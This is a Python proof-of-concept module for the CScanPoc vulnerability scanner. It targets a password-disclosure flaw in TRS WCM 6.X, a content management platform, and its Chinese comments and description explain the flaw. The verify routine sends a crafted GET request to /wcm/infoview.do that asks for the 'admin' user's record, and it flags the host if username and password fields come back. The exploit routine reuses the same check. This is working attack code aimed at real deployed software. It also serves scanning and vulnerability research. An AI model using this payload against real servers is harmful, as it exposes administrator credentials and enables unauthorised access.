# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TRS-WCM_0001'  # 平台漏洞编号，留空
    name = '拓尔思内容协作平台 用户密码泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        TRS Web Content Management( TRS WCM ), 是-套完全基于Java和浏览器技术的网络内容管理软件。
        TRS WCM(拓尔思内容协作平台) 6.X /wcm/infoview.do 位置用户密码泄漏。
    '''  # 漏洞描述
    ref = 'http://reboot.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TRS-WCM(拓尔思内容协作平台)'  # 漏洞应用名称
    product_version = '6.X'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ff6ef8f-6445-4572-ac67-727a8a6f3624'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/wcm/infoview.do?serviceid=wcm6_user&MethodName=getUsersByNames&UserNames=admin'
            verify_url = self.target + payload
            #code, head, res, errcode, _ = curl.curl2(url)
            r = requests.get(verify_url)

            if r.status_code == 200 and '<USERNAME>' in r.text and '<PASSWORD>' in r.text:
                #security_hole('<WCM> getshell '+ arg + payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
